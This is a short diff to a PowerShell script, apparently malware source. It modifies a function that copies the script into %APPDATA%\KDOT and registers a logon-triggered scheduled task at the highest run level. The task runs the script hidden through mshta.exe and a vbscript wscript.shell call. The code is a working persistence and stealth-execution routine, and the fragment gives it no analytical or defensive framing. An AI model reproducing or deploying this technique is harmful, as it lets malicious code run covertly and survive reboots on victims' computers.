@@ -221,7 +221,7 @@ function Invoke-TASKS {
     Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
     $task_name = "KDOT"
-    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell -file %appdata%\kdot\kdot.ps1",0)(window.close)'
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -file %appdata%\kdot\kdot.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
